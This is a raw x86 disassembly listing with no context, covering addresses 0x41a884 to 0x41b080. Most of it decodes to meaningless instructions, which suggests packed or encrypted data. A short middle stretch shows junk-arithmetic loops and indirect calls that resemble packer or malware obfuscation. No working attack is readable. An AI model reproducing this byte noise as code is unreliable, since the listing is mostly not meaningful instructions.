  41a884:	out    0x68,al
  41a886:	fs imul ecx,edx,0x1b
  41a88a:	mov    ah,0xb7
  41a88c:	pop    esi
  41a88d:	fcmovne st,st(3)
  41a88f:	ror    BYTE PTR [ebx+0x69],1
  41a892:	dec    ecx
  41a893:	ins    DWORD PTR es:[edi],dx
  41a894:	shl    BYTE PTR [edx+0x66],cl
  41a897:	icebp  
  41a898:	sub    ecx,DWORD PTR [edx+ecx*4]
  41a89b:	shl    dh,0x5a
  41a89e:	jle    0x41a8a0
  41a8a0:	aas    
  41a8a1:	pop    ds
  41a8a2:	sti    
  41a8a3:	lods   al,BYTE PTR ds:[esi]
  41a8a4:	leave  
  41a8a5:	jp     0x41a8f8
  41a8a7:	pop    edi
  41a8a8:	fs mov ah,0x8b
  41a8ab:	inc    esp
  41a8ac:	mov    esi,0x73ad5e0
  41a8b1:	mov    ecx,0xad9de110
  41a8b6:	push   ebx
  41a8b7:	inc    eax
  41a8b8:	xor    WORD PTR [ecx],bx
  41a8bb:	in     eax,dx
  41a8bc:	int3   
  41a8bd:	dec    edx
  41a8be:	mov    ebx,0x7e0377e0
  41a8c3:	repnz rcr bl,cl
  41a8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c7:	ja     0x41a8ad
  41a8c9:	cmp    eax,0xc16edac6
  41a8ce:	mov    ebp,0x6a501c52
  41a8d3:	pop    ss
  41a8d4:	cmp    DWORD PTR [ebx],edx
  41a8d6:	xchg   ecx,eax
  41a8d7:	js     0x41a8f3
  41a8d9:	lahf   
  41a8da:	add    DWORD PTR [ebp-0x1c],eax
  41a8dd:	xor    eax,0x70460d5a
  41a8e2:	dec    esi
  41a8e3:	mov    bh,0x89
  41a8e5:	mov    ds:0x7d57a631,eax
  41a8ea:	adc    BYTE PTR [eax],0xf7
  41a8ed:	add    ah,BYTE PTR ds:0xa6e4b845
  41a8f3:	(bad)  
  41a8f5:	jmp    0xcd2897c
  41a8fa:	xchg   ebp,eax
  41a8fb:	cmp    eax,0x86f3528e
  41a900:	dec    eax
  41a901:	dec    edx
  41a902:	fisttp DWORD PTR [ebp-0x3b78e327]
  41a908:	mov    eax,ds:0x18174537
  41a90d:	mov    esp,0x6fae39af
  41a912:	into   
  41a913:	dec    ebx
  41a914:	mov    bl,0x7b
  41a916:	test   edx,esp
  41a918:	das    
  41a919:	push   esi
  41a91a:	xchg   DWORD PTR [edi+0x5880d71a],esi
  41a920:	sub    ch,BYTE PTR [esi+0x18980556]
  41a926:	xor    eax,DWORD PTR [ebp-0x2e416680]
  41a92c:	jmp    0xbde0:0xb04931aa
  41a933:	fnstcw WORD PTR [esi]
  41a935:	fisttp DWORD PTR [ecx-0x70]
  41a938:	xor    eax,0xfaebe4e3
  41a93d:	sar    DWORD PTR [esi],1
  41a93f:	pop    ecx
  41a940:	dec    esi
  41a941:	retf   0x38b6
  41a944:	xchg   ah,ch
  41a946:	mov    bl,0x50
  41a948:	push   ds
  41a949:	sub    eax,0x709445f4
  41a94e:	lods   al,BYTE PTR ds:[esi]
  41a94f:	in     eax,0xc6
  41a951:	bound  ecx,QWORD PTR [bp+di]
  41a954:	repz repnz into 
  41a957:	xor    al,BYTE PTR [ebp+0x3d322de4]
  41a95d:	add    BYTE PTR [bp+di-0x6bfd],ah
  41a962:	mov    BYTE PTR [ebx],bl
  41a964:	mov    DWORD PTR [ebp-0x3],edi
  41a967:	aas    
  41a968:	mov    edi,0x59a86824
  41a96d:	and    esi,DWORD PTR [eax+0x6c59584c]
  41a973:	jo     0x41a91c
  41a975:	mov    ecx,0xec97b2
  41a97a:	in     al,0x94
  41a97c:	test   BYTE PTR [edi+0x3a],0xd3
  41a980:	out    0x2f,eax
  41a982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a983:	mov    ecx,0x9e12935a
  41a988:	iret   
  41a989:	imul   ecx,DWORD PTR [ebp+0x2d03b5e1],0x2bc61476
  41a993:	mov    esp,0x36a6fa80
  41a998:	(bad)  [esi+0x35]
  41a99b:	div    DWORD PTR [ebp-0x6d]
  41a99e:	fcmovnbe st,st(1)
  41a9a0:	aaa    
  41a9a1:	aas    
  41a9a2:	jmp    0x6c96cc23
  41a9a7:	call   0x47ae:0x251b297
  41a9ae:	or     BYTE PTR [edi-0x2f],0xd
  41a9b2:	mov    esi,0x1fc3ef02
  41a9b7:	push   ebx
  41a9b8:	cmp    al,BYTE PTR ds:0x90e4c034
  41a9be:	mov    ch,0x19
  41a9c0:	xchg   esp,eax
  41a9c1:	cs cld 
  41a9c3:	loope  0x41a9c7
  41a9c5:	xchg   esp,eax
  41a9c6:	clc    
  41a9c7:	mov    ch,dh
  41a9c9:	addr16 leave 
  41a9cb:	pop    esi
  41a9cc:	enter  0x6dd5,0x98
  41a9d0:	nop
  41a9d1:	push   ds
  41a9d2:	xor    ah,bh
  41a9d4:	(bad)  
  41a9d5:	imul   esi,ecx,0x4a
  41a9d8:	aad    0x78
  41a9da:	out    0x7e,al
  41a9dc:	sbb    DWORD PTR [ecx+0x418d8fa8],eax
  41a9e2:	loopne 0x41aa52
  41a9e4:	sti    
  41a9e5:	test   ah,ah
  41a9e7:	or     dh,BYTE PTR [edx]
  41a9e9:	out    0xab,al
  41a9eb:	mov    al,0x87
  41a9ed:	push   DWORD PTR ds:0xe11b6830
  41a9f3:	push   ss
  41a9f4:	(bad)  
  41a9f5:	push   ecx
  41a9f6:	out    dx,eax
  41a9f7:	jmp    0xa308:0x6fe68a30
  41a9fe:	outs   dx,BYTE PTR ds:[esi]
  41a9ff:	js     0x41a9d9
  41aa01:	ins    DWORD PTR es:[edi],dx
  41aa02:	retf   
  41aa03:	and    BYTE PTR [eax],ch
  41aa05:	inc    esp
  41aa06:	punpckhdq mm2,mm3
  41aa09:	jg     0x41aa42
  41aa0b:	pop    ecx
  41aa0c:	std    
  41aa0d:	mov    bh,0x57
  41aa0f:	popa   
  41aa10:	sbb    BYTE PTR [edi-0x1e],ch
  41aa13:	jp     0x41aa8d
  41aa15:	popa   
  41aa16:	sub    eax,0x4dd0cdca
  41aa1b:	inc    ebx
  41aa1c:	jne    0x41aa99
  41aa1e:	pop    edi
  41aa1f:	push   esi
  41aa20:	dec    ecx
  41aa21:	and    BYTE PTR [ecx-0xd],bl
  41aa24:	and    eax,0xdb1d1d30
  41aa29:	mov    dh,0xd4
  41aa2b:	daa    
  41aa2c:	dec    ebp
  41aa2d:	cmp    al,0xda
  41aa2f:	iret   
  41aa30:	rcr    DWORD PTR [ebx+0x13343998],1
  41aa36:	xor    BYTE PTR [edx+0x2d],0x8b
  41aa3a:	mov    WORD PTR [ebx+esi*1],ds
  41aa3d:	dec    ebx
  41aa3e:	inc    esi
  41aa3f:	lds    edx,FWORD PTR [edx+0x7ac9e9a1]
  41aa45:	imul   eax,DWORD PTR [ebx+0xbba8443],0x40c453fc
  41aa4f:	repnz xlat BYTE PTR cs:[ebx]
  41aa52:	add    eax,0x4d335363
  41aa57:	sub    cl,BYTE PTR [esi]
  41aa59:	pop    ss
  41aa5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa5b:	nop
  41aa5c:	dec    eax
  41aa5d:	sub    BYTE PTR [esi-0x27],al
  41aa60:	aaa    
  41aa61:	popf   
  41aa62:	sub    sp,WORD PTR [edx]
  41aa65:	out    0xcf,al
  41aa67:	or     BYTE PTR [ebx+0xfa65aee],dh
  41aa6d:	pop    ebx
  41aa6e:	adc    al,0x7a
  41aa70:	cwde   
  41aa71:	cli    
  41aa72:	repnz or cl,BYTE PTR [ebx]
  41aa75:	push   eax
  41aa76:	fwait
  41aa77:	mov    ch,0xbb
  41aa79:	pop    edx
  41aa7a:	mov    edi,0xe2bc0a1e
  41aa7f:	test   DWORD PTR [esi-0x1fb79182],ebx
  41aa85:	dec    esi
  41aa86:	or     BYTE PTR [edi+0x54],bl
  41aa89:	push   ebx
  41aa8a:	mov    eax,0x2d23ec5b
  41aa8f:	fstp   DWORD PTR [edx+0x2e]
  41aa92:	pop    ss
  41aa93:	jecxz  0x41aa97
  41aa95:	es inc esi
  41aa97:	sub    BYTE PTR [edx-0x773af0e7],bl
  41aa9d:	add    bh,al
  41aa9f:	imul   edi,edx,0x7ab4c614
  41aaa5:	shl    BYTE PTR [ebx],0x14
  41aaa8:	add    DWORD PTR [ebp-0x33],ebp
  41aaab:	mov    ds:0xe9b1c7c7,al
  41aab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab1:	add    bl,BYTE PTR [ecx-0x28394aab]
  41aab7:	rcr    ebx,1
  41aab9:	add    DWORD PTR [edx+esi*2+0x6922298a],edx
  41aac0:	sbb    bh,bl
  41aac2:	xchg   BYTE PTR [esp+eiz*8-0x64],bl
  41aac6:	push   ecx
  41aac7:	jp     0x41aade
  41aac9:	xchg   ecx,eax
  41aaca:	mov    bh,BYTE PTR [ebx+ebx*1]
  41aacd:	imul   eax,DWORD PTR [edi],0xffffffbc
  41aad0:	inc    ebx
  41aad1:	ja     0x41ab27
  41aad3:	scas   al,BYTE PTR es:[edi]
  41aad4:	pop    ds
  41aad5:	mov    eax,0x46470c89
  41aada:	lods   al,BYTE PTR ds:[esi]
  41aadb:	jmp    0xf7ebc0a8
  41aae0:	pop    ss
  41aae1:	ins    BYTE PTR es:[edi],dx
  41aae2:	call   0x5493f59b
  41aae7:	sbb    al,0xc8
  41aae9:	sbb    al,0xa2
  41aaeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaec:	jb     0x41ab38
  41aaee:	mov    eax,ds:0x2957dcee
  41aaf3:	rcl    ebp,0xd2
  41aaf6:	arpl   WORD PTR [ecx-0x5def5f2d],dx
  41aafc:	jns    0x41aa86
  41aafe:	hlt    
  41aaff:	or     BYTE PTR [ebx+0x51],cl
  41ab02:	jae    0x41ab55
  41ab04:	daa    
  41ab05:	jae    0x41aaac
  41ab07:	in     al,0x89
  41ab09:	push   ss
  41ab0a:	cmc    
  41ab0b:	lahf   
  41ab0c:	popa   
  41ab0d:	xor    DWORD PTR [edx+0x7f],0x9859c79b
  41ab14:	rcr    DWORD PTR [esi+0x72],1
  41ab17:	js     0x41ab5c
  41ab19:	or     eax,0x29a448ab
  41ab1e:	iret   
  41ab1f:	sbb    ebp,DWORD PTR [edi]
  41ab21:	mov    ds:0xdb971b04,eax
  41ab26:	or     BYTE PTR [edi+edi*8+0x651bde4d],ah
  41ab2d:	(bad)  
  41ab2e:	jnp    0x41aaeb
  41ab30:	xchg   DWORD PTR [ecx+0x29ceae6c],edi
  41ab36:	inc    ebp
  41ab37:	inc    esi
  41ab38:	sti    
  41ab39:	int3   
  41ab3a:	sbb    al,0x6e
  41ab3c:	sbb    ecx,DWORD PTR [edi-0x28082b0d]
  41ab42:	sub    DWORD PTR [esi],esp
  41ab44:	mov    bl,0x5f
  41ab46:	xchg   esp,eax
  41ab47:	arpl   WORD PTR [eax],bx
  41ab49:	stos   DWORD PTR es:[edi],eax
  41ab4a:	jl     0x41ab0e
  41ab4c:	mov    ds:0xb0503e43,al
  41ab51:	fisubr WORD PTR [ebx]
  41ab53:	ds jp  0x41aaf3
  41ab56:	jmp    0x75a:0xa003ff21
  41ab5d:	enter  0xf752,0x34
  41ab61:	pop    esp
  41ab62:	lea    ebp,[ebp+0x4aa3802c]
  41ab68:	xlat   BYTE PTR ds:[ebx]
  41ab69:	xchg   ebp,eax
  41ab6a:	pop    edi
  41ab6b:	(bad)  
  41ab6d:	xchg   ebx,eax
  41ab6e:	mov    esi,0x4a372072
  41ab73:	inc    edx
  41ab74:	pop    esi
  41ab75:	(bad)  
  41ab77:	pop    esi
  41ab78:	test   al,0x24
  41ab7a:	cdq    
  41ab7b:	xchg   DWORD PTR [eax+ecx*2],edx
  41ab7e:	clc    
  41ab7f:	xor    dl,dh
  41ab81:	mov    cl,0xef
  41ab83:	or     DWORD PTR [ebp-0x5bf1d2f1],esi
  41ab89:	mov    ebp,0x75814bad
  41ab8e:	(bad)  
  41ab8f:	test   eax,0x9e882abe
  41ab94:	xlat   BYTE PTR ds:[ebx]
  41ab95:	mov    eax,0xb9143f04
  41ab9a:	ret    
  41ab9b:	xchg   edi,eax
  41ab9c:	das    
  41ab9d:	mov    bl,0x1e
  41ab9f:	push   edx
  41aba0:	popf   
  41aba1:	mov    al,0x8d
  41aba3:	fisttp DWORD PTR [ecx]
  41aba5:	mov    dh,ah
  41aba7:	jb     0x41abc9
  41aba9:	aad    0xec
  41abab:	int3   
  41abac:	inc    edx
  41abad:	cwde   
  41abae:	dec    edx
  41abaf:	sbb    al,0xd0
  41abb1:	mov    edi,DWORD PTR [ebx+0x3510efdc]
  41abb7:	int3   
  41abb8:	(bad)  
  41abb9:	fimul  DWORD PTR [eax+edx*1+0x2c]
  41abbd:	ds jl  0x41abee
  41abc0:	xor    al,0x5e
  41abc2:	loope  0x41ac28
  41abc4:	xor    al,0x29
  41abc6:	cmp    esp,DWORD PTR [eax]
  41abc8:	lds    ecx,FWORD PTR [ebx+0x48346c12]
  41abce:	cdq    
  41abcf:	gs or  esp,esi
  41abd2:	std    
  41abd3:	cmp    BYTE PTR [ebx+0x6de2f3ce],ch
  41abd9:	adc    BYTE PTR [edi*1-0x6bdf318e],bh
  41abe0:	scas   eax,DWORD PTR es:[edi]
  41abe1:	repz gs add al,0xdd
  41abe5:	je     0x41ac37
  41abe7:	fcmovnu st,st(7)
  41abe9:	inc    edi
  41abea:	mov    eax,0x23fa3b48
  41abef:	add    ebp,DWORD PTR [ebp-0x24]
  41abf2:	(bad)  
  41abf3:	mov    edi,0x7445b98
  41abf8:	hlt    
  41abf9:	jbe    0x41ac10
  41abfb:	leave  
  41abfc:	aam    0x48
  41abfe:	scas   al,BYTE PTR es:[edi]
  41abff:	or     eax,0x79d1375b
  41ac04:	mov    al,ds:0x1c6c0b12
  41ac09:	push   cs
  41ac0a:	and    al,0xc6
  41ac0c:	inc    esi
  41ac0d:	xor    eax,0x11d768f3
  41ac12:	add    cl,bh
  41ac14:	pop    esp
  41ac15:	call   FWORD PTR [eax-0x3]
  41ac18:	inc    ecx
  41ac19:	ja     0x41ac75
  41ac1b:	sbb    ecx,ebp
  41ac1d:	mov    BYTE PTR [ecx],cl
  41ac1f:	xchg   WORD PTR [ecx-0x48c8d29c],di
  41ac26:	int3   
  41ac27:	mov    eax,ds:0xf2c56548
  41ac2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac2e:	cmp    ebp,DWORD PTR [ebp+0x28]
  41ac31:	sbb    ecx,eax
  41ac33:	inc    esi
  41ac34:	sub    DWORD PTR [edi],ebp
  41ac36:	(bad)  
  41ac38:	sub    DWORD PTR [edx+0x336fe1e0],esi
  41ac3e:	data16 in al,0xcc
  41ac41:	sbb    edx,DWORD PTR [ebx]
  41ac43:	cdq    
  41ac44:	ins    BYTE PTR es:[edi],dx
  41ac45:	jbe    0x41aca6
  41ac47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac48:	test   esp,0xdf6eeaed
  41ac4e:	jo     0x41ac8e
  41ac50:	pop    ecx
  41ac51:	fstp   DWORD PTR [ebx+ecx*8-0x297f3e01]
  41ac58:	out    dx,eax
  41ac59:	or     bl,BYTE PTR ss:[edx-0x3df67e3f]
  41ac60:	fisub  WORD PTR [ebx]
  41ac62:	or     eax,0xf2aa3485
  41ac67:	mov    cl,0xcf
  41ac69:	sub    eax,0x791c1603
  41ac6e:	fwait
  41ac6f:	push   esi
  41ac70:	pop    edx
  41ac71:	nop
  41ac72:	fcom   DWORD PTR [eax*2-0x25c2187f]
  41ac79:	ror    DWORD PTR [eax-0x3d],0x6c
  41ac7d:	bound  eax,QWORD PTR [edi+0x7b]
  41ac80:	jo     0x41ac73
  41ac82:	cmp    eax,0x1a3f7c22
  41ac87:	xor    BYTE PTR [ebx+0x7ca9447d],0xe2
  41ac8e:	mov    esi,gs
  41ac90:	push   cs
  41ac91:	add    esi,0x66076f27
  41ac97:	int3   
  41ac98:	add    ch,bl
  41ac9a:	in     eax,dx
  41ac9b:	pop    edi
  41ac9c:	mov    esi,0x48ae1f9b
  41aca1:	jb     0x41ac7d
  41aca3:	mov    dl,0xe1
  41aca5:	(bad)  
  41aca6:	in     eax,dx
  41aca7:	mov    ch,0x37
  41aca9:	sbb    edx,DWORD PTR [edi+0x45]
  41acac:	(bad)  
  41acad:	cmp    bl,dl
  41acaf:	dec    esi
  41acb0:	jmp    0xb0dbb9fd
  41acb5:	sbb    eax,0xe2aecbb7
  41acba:	push   ds
  41acbb:	sub    BYTE PTR [ecx],dl
  41acbd:	push   eax
  41acbe:	xor    eax,0xe3921321
  41acc3:	sub    BYTE PTR [bp+di],ch
  41acc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc7:	(bad)  
  41acc8:	cmp    ebp,DWORD PTR [esi-0x7a646b8b]
  41acce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41accf:	out    dx,eax
  41acd0:	mov    WORD PTR [edx+ebp*2+0x19d9d3c0],cs
  41acd7:	mov    ecx,0x1a38d827
  41acdc:	mov    ebx,0x42eea3e1
  41ace1:	test   edi,edi
  41ace3:	jl     0x41ac9a
  41ace5:	das    
  41ace6:	mul    BYTE PTR [eax]
  41ace8:	retf   
  41ace9:	aam    0xc
  41aceb:	mov    bh,0x8f
  41aced:	sti    
  41acee:	adc    dl,ch
  41acf0:	push   ecx
  41acf1:	jmp    0xa6d2:0x42ce1409
  41acf8:	xchg   ebp,eax
  41acf9:	xor    eax,DWORD PTR [ebx]
  41acfb:	add    BYTE PTR [ebp+0x15],al
  41acfe:	stos   DWORD PTR es:[edi],eax
  41acff:	les    edx,FWORD PTR [edx-0x7b]
  41ad02:	xor    BYTE PTR [eax+0x17],bh
  41ad05:	xchg   BYTE PTR [ebx],ah
  41ad07:	out    dx,eax
  41ad08:	xchg   ebx,eax
  41ad09:	inc    ecx
  41ad0a:	add    DWORD PTR [eax-0x56],esp
  41ad0d:	adc    bh,ch
  41ad0f:	pop    ebx
  41ad10:	shr    BYTE PTR [ebx],0x4b
  41ad13:	arpl   WORD PTR [edi+0xf],bx
  41ad16:	dec    eax
  41ad17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad18:	mov    bl,0x25
  41ad1a:	fisubr WORD PTR [ebx-0x7cd628c2]
  41ad20:	(bad)  
  41ad21:	cmp    al,0x4d
  41ad23:	int    0x8e
  41ad25:	mov    dh,0xdb
  41ad27:	popa   
  41ad28:	push   ds
  41ad29:	out    dx,al
  41ad2a:	(bad)  
  41ad2b:	(bad)  
  41ad2c:	xor    eax,0xaa7f8919
  41ad31:	daa    
  41ad32:	jmp    0x53:0x3091527a
  41ad39:	das    
  41ad3a:	scas   eax,DWORD PTR es:[edi]
  41ad3b:	mov    bl,0xcf
  41ad3d:	push   cs
  41ad3e:	repnz nop
  41ad40:	ss mov ecx,0x302aec25
  41ad46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad47:	lock xor ecx,ebx
  41ad4a:	(bad)  
  41ad4b:	fidivr WORD PTR [ebx+0xf]
  41ad4e:	pop    ebx
  41ad4f:	mov    al,al
  41ad51:	pop    ebp
  41ad52:	pop    ebx
  41ad53:	sub    eax,0xb3d40ff1
  41ad58:	jne    0x41ad58
  41ad5a:	xlat   BYTE PTR ds:[ebx]
  41ad5b:	outs   dx,BYTE PTR ds:[esi]
  41ad5c:	cli    
  41ad5d:	test   BYTE PTR [eax],bh
  41ad5f:	or     BYTE PTR [eax-0x1b],dh
  41ad62:	arpl   cx,di
  41ad64:	and    esi,DWORD PTR [ecx-0x4a]
  41ad67:	pop    esp
  41ad68:	sahf   
  41ad69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad6a:	or     dh,BYTE PTR [ebp+0x42]
  41ad6d:	lds    esp,FWORD PTR ds:0xe33bb35d
  41ad73:	lock mov WORD PTR [ebx-0x2ca133bb],?
  41ad7a:	xchg   edx,eax
  41ad7b:	or     eax,0xfaff5b10
  41ad80:	arpl   WORD PTR [ecx],sp
  41ad82:	push   esp
  41ad83:	mov    ecx,0xfcf11a28
  41ad88:	push   0x14
  41ad8a:	jmp    0x84548f83
  41ad8f:	inc    esp
  41ad90:	test   BYTE PTR [edx],ah
  41ad92:	dec    ebx
  41ad93:	pop    ecx
  41ad94:	cmp    al,0xf5
  41ad96:	clc    
  41ad97:	ja     0x41ad75
  41ad99:	or     bh,ah
  41ad9b:	lock cdq 
  41ad9d:	cli    
  41ad9e:	stos   BYTE PTR es:[edi],al
  41ad9f:	clc    
  41ada0:	add    DWORD PTR [edi+0x22002ee3],edi
  41ada6:	cmp    al,0x73
  41ada8:	jecxz  0x41ae16
  41adaa:	(bad)  
  41adab:	or     edi,esp
  41adad:	int    0x4a
  41adaf:	mov    ch,0x64
  41adb1:	aad    0xe3
  41adb3:	loope  0x41ae05
  41adb5:	and    BYTE PTR [ebp+0x51f36e60],0xc7
  41adbc:	and    ecx,eax
  41adbe:	xchg   DWORD PTR [edx],esi
  41adc0:	adc    al,0x6
  41adc2:	mov    al,BYTE PTR [esi-0x5dbd9b52]
  41adc8:	fmul   QWORD PTR [eax-0x153715cc]
  41adce:	scas   eax,DWORD PTR es:[edi]
  41adcf:	mov    ah,0xf7
  41add1:	ror    al,1
  41add3:	pop    esi
  41add4:	pusha  
  41add5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41add6:	mov    dl,bl
  41add8:	jp     0x41adc8
  41adda:	jmp    0x7193841f
  41addf:	mov    es,WORD PTR [edi+0x51df0f51]
  41ade5:	fisttp WORD PTR [ebp-0x2574bb8d]
  41adeb:	or     eax,0xb165cb16
  41adf0:	mov    al,0x6a
  41adf2:	bound  ebx,QWORD PTR [eax+0x3a40942]
  41adf8:	cld    
  41adf9:	loop   0x41ae5d
  41adfb:	test   DWORD PTR [esi],0x792aa60e
  41ae01:	out    0xd6,al
  41ae03:	mov    ch,0xcb
  41ae05:	pop    eax
  41ae06:	aad    0xe7
  41ae08:	ret    
  41ae09:	mov    al,ds:0x497dc5a5
  41ae0e:	jnp    0x41ae36
  41ae10:	pushf  
  41ae11:	(bad)  
  41ae12:	btc    edi,eax
  41ae15:	sbb    ebp,esi
  41ae17:	sti    
  41ae18:	mov    ds:0x3f79aa8b,al
  41ae1d:	sbb    eax,0x47e3cd7a
  41ae22:	in     eax,0x5a
  41ae24:	dec    esi
  41ae25:	sub    ebp,0xffffffc6
  41ae28:	and    al,0x57
  41ae2a:	add    al,BYTE PTR [eax+eax*2-0x342634d1]
  41ae31:	sti    
  41ae32:	mov    dh,0xe5
  41ae34:	rcr    DWORD PTR [ecx],1
  41ae36:	div    ah
  41ae38:	jg     0x41ae3b
  41ae3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae3b:	dec    ecx
  41ae3c:	cmp    esi,DWORD PTR [ebx]
  41ae3e:	repz or ebx,ecx
  41ae41:	and    BYTE PTR [ebx+0x32c7793e],bh
  41ae47:	add    al,bh
  41ae49:	fnstenv [edi]
  41ae4b:	adc    ch,BYTE PTR [esi+0x76]
  41ae4e:	sbb    DWORD PTR [ecx+0x179bf530],0xc98fe936
  41ae58:	pop    edi
  41ae59:	and    esp,ecx
  41ae5b:	mov    eax,ds:0xeea373a9
  41ae60:	pushf  
  41ae61:	jbe    0x41ae66
  41ae63:	push   esp
  41ae64:	ins    DWORD PTR es:[edi],dx
  41ae65:	repz leave 
  41ae67:	pop    edi
  41ae68:	gs fwait
  41ae6a:	inc    edx
  41ae6b:	enter  0xc192,0xe8
  41ae6f:	repnz inc ebp
  41ae71:	jno    0x41aeeb
  41ae73:	xor    DWORD PTR [edx],esi
  41ae75:	inc    ebx
  41ae76:	test   DWORD PTR [ecx+0x42],0x363a07a5
  41ae7d:	and    DWORD PTR [edx+0x52],ebx
  41ae80:	cwde   
  41ae81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae82:	mov    ah,0x2d
  41ae84:	(bad)  
  41ae86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae87:	mov    ?,WORD PTR [eax-0x6e]
  41ae8a:	pop    es
  41ae8b:	les    ebp,FWORD PTR [edi-0x60]
  41ae8e:	jb     0x41ae2f
  41ae90:	cdq    
  41ae91:	push   ds
  41ae92:	jns    0x41aee5
  41ae94:	xchg   edi,eax
  41ae95:	cmp    ah,bl
  41ae97:	inc    edx
  41ae98:	data16 jle 0x41af1a
  41ae9b:	(bad)  
  41ae9c:	jg     0x41af02
  41ae9e:	dec    ebx
  41ae9f:	loope  0x41ae51
  41aea1:	mov    al,ds:0x18b52215
  41aea6:	(bad)  
  41aea7:	add    bl,BYTE PTR [edx+ebx*8]
  41aeaa:	sbb    DWORD PTR [ebx],ebx
  41aeac:	inc    ebp
  41aead:	mov    esi,0x558bc654
  41aeb2:	or     BYTE PTR [ecx],ch
  41aeb4:	adc    eax,0x42a292
  41aeb9:	mov    ebx,DWORD PTR [ebp-0x58]
  41aebc:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  41aec6:	add    edx,0x5708fa
  41aecc:	imul   edx,ebx
  41aecf:	sbb    ebx,0x1e47
  41aed5:	mov    DWORD PTR [ebp-0x58],edx
  41aed8:	or     DWORD PTR ds:0x42a29e,0x157
  41aee2:	mov    edx,DWORD PTR [ebp+0x8]
  41aee5:	sub    ebx,DWORD PTR ds:0x42a2f2
  41aeeb:	mov    ebx,DWORD PTR [ebp-0x54]
  41aeee:	add    edx,0x64f898
  41aef4:	or     DWORD PTR ds:0x42a25a,0x5c58
  41aefe:	or     edx,ebx
  41af00:	mov    ebx,DWORD PTR ds:0x42a322
  41af06:	mov    ebx,DWORD PTR [ebx]
  41af08:	sbb    DWORD PTR ds:0x42a2ee,ebx
  41af0e:	mov    DWORD PTR [ebp-0x54],edx
  41af11:	movzx  edx,WORD PTR ds:0x42a2c2
  41af18:	sub    DWORD PTR ds:0x42a28e,edx
  41af1e:	mov    edx,DWORD PTR [ebp+0x8]
  41af21:	xor    ebx,DWORD PTR ds:0x42a28a
  41af27:	mov    ebx,DWORD PTR [ebp-0x50]
  41af2a:	adc    DWORD PTR ds:0x42a29a,0x42a2a6
  41af34:	add    edx,ecx
  41af36:	sbb    DWORD PTR ds:0x42a2f2,0x42a2de
  41af40:	xor    edx,ebx
  41af42:	or     DWORD PTR ds:0x42a2de,edx
  41af48:	mov    DWORD PTR [ebp-0x50],edx
  41af4b:	and    DWORD PTR ds:0x42a262,0x0
  41af55:	xor    edx,edx
  41af57:	xor    edx,DWORD PTR ds:0x42a262
  41af5d:	inc    edx
  41af5e:	mov    DWORD PTR ds:0x42a262,edx
  41af64:	cmp    DWORD PTR ds:0x42a262,0x5
  41af6b:	jbe    0x41afb0
  41af71:	jmp    0x41af87
  41af76:	push   0x1fcb
  41af7b:	push   DWORD PTR [ebp-0x28]
  41af7e:	push   DWORD PTR [ebp-0x24]
  41af81:	call   DWORD PTR ds:0x42a402
  41af87:	cmp    DWORD PTR ds:0x42a262,0x4
  41af8e:	jne    0x41afa3
  41af94:	xor    edx,edx
  41af96:	or     edx,DWORD PTR ds:0x42a262
  41af9c:	inc    edx
  41af9d:	mov    DWORD PTR ds:0x42a262,edx
  41afa3:	cmp    DWORD PTR ds:0x42a262,0x16
  41afaa:	jb     0x41af55
  41afb0:	mov    edx,DWORD PTR [ebp+0x8]
  41afb3:	and    DWORD PTR ds:0x42a2f2,0x0
  41afbd:	xor    ebx,ebx
  41afbf:	or     ebx,DWORD PTR ds:0x42a2f2
  41afc5:	inc    ebx
  41afc6:	mov    DWORD PTR ds:0x42a2f2,ebx
  41afcc:	cmp    DWORD PTR ds:0x42a2f2,0xb
  41afd3:	jl     0x41b024
  41afd9:	jmp    0x41affd
  41afde:	push   0x1
  41afe0:	push   DWORD PTR [ebp-0x10]
  41afe3:	push   0x5b88
  41afe8:	push   0x81d2
  41afed:	push   0x4421
  41aff2:	push   0x50f5
  41aff7:	call   DWORD PTR ds:0x42a3c2
  41affd:	cmp    DWORD PTR ds:0x42a2f2,0xa
  41b004:	jne    0x41b017
  41b00a:	mov    ebx,DWORD PTR ds:0x42a2f2
  41b010:	inc    ebx
  41b011:	mov    DWORD PTR ds:0x42a2f2,ebx
  41b017:	cmp    DWORD PTR ds:0x42a2f2,0x18
  41b01e:	jb     0x41afbd
  41b024:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b027:	adc    DWORD PTR ds:0x42a2f6,0x42a2e2
  41b031:	jmp    0x41d389
  41b036:	xchg   ebx,eax
  41b037:	jmp    0xab5b1b75
  41b03c:	add    DWORD PTR [ecx+0x1dcb2f48],0x44162e5e
  41b046:	mov    bh,bh
  41b048:	jl     0x41afcd
  41b04a:	inc    esi
  41b04b:	pop    esi
  41b04c:	add    DWORD PTR [ebx-0x248d57a8],0xffffffdf
  41b053:	lahf   
  41b054:	jg     0x41b067
  41b056:	cs ins DWORD PTR es:[edi],dx
  41b058:	and    BYTE PTR [ebx-0x52],dh
  41b05b:	pushf  
  41b05c:	and    al,0xf9
  41b05e:	and    DWORD PTR [ebx],edi
  41b060:	xchg   esi,eax
  41b061:	cwde   
  41b062:	sar    ebx,0xb0
  41b065:	rol    DWORD PTR [esi],0x37
  41b068:	adc    DWORD PTR ds:0x40aff5b9,edi
  41b06e:	sub    eax,0xf8d8a603
  41b073:	mov    ecx,0x7af051e0
  41b078:	sub    BYTE PTR [edx-0x25],0x5d
  41b07c:	aad    0x2f
  41b07e:	or     bl,dh
  41b080:	mov    ah,0x13
